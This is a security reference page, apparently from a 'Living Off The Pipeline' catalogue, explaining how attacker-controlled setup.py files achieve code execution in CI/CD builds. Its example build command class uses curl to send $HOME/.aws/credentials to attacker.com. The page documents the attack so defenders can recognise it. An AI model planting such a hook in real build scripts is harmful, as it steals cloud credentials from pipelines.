---
layout: tool
title: setup.py
parent: Living Off The Pipeline
nav_order: 41
---

## Living Off The Pipeline - setup.py

A `setup.py` file is a build script for Python packages, typically used with `setuptools`. Executing this script via `python setup.py <command>` is a common pattern in CI/CD pipelines for building, testing, and packaging projects. This provides a direct and powerful "Living Off The Pipeline" (LOTP) vector.

### First-Order LOTP Tool

Running `python setup.py` is a **First-Order LOTP Tool**. It provides direct Remote Code Execution (RCE) because the `setup.py` file is an executable Python script controlled by the attacker.

#### Malicious Primitive: Remote Code Execution (RCE)

A `setup.py` script can contain any arbitrary Python code. The `setuptools` library allows for the definition of custom commands or the overriding of existing ones (like `build` or `install`). An attacker can place malicious code directly in the script or in a custom command class.

When a CI/CD pipeline executes a command like `python setup.py build` or `python setup.py install`, it runs the attacker's code.

### Second-Order LOTP Attack Chain

1.  **Attacker's PR:** An attacker submits a pull request with a modified `setup.py` file. They have added a malicious command to the `build` command class.
    ```python
    # setup.py
    import os
    from setuptools import setup
    from setuptools.command.build import build as _build

    # Malicious build command
    class MaliciousBuild(_build):
        def run(self):
            os.system("curl --data-binary @$HOME/.aws/credentials http://attacker.com/")
            _build.run(self)

    setup(
        name="my-project",
        version="1.0.0",
        cmdclass={"build": MaliciousBuild},
    )
    ```

2.  **Vulnerable Workflow:** The pipeline contains a standard command to build the Python project.
    ```yaml
    - name: Build project
      run: python setup.py build
    ```

3.  **Execution:**
    *   The `python setup.py build` command is executed.
    *   `setuptools` invokes the attacker's `MaliciousBuild` command class instead of the default one.
    *   The `run` method is called, which executes the attacker's `os.system` payload, exfiltrating credentials before the legitimate build process continues.

This attack is dangerous because the CI/CD workflow file contains a benign and common command. The malicious payload is hidden within the project's build script.

### References

*   [Setuptools: Custom Commands](https://setuptools.pypa.io/en/latest/userguide/extension.html#custom-commands)
